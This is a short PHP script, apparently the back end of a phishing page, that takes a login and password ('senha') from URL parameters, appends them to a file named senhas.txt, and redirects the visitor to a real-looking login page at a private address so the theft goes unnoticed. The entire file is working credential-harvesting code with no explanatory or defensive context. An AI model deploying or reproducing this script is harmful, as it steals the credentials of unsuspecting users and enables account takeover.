<?php
$campo1 = $_GET['login'] . '\n';
$campo2 = $_GET['senha'] . '\n';

$arquivo = fopen("senhas.txt", "a");

$escreve1 = fwrite($arquivo, $campo1);
$escreve2 = fwrite($arquivo, $campo2);

fclose($arquivo);

header("Location: http://172.16.1.10/turismo/login.php");
?>
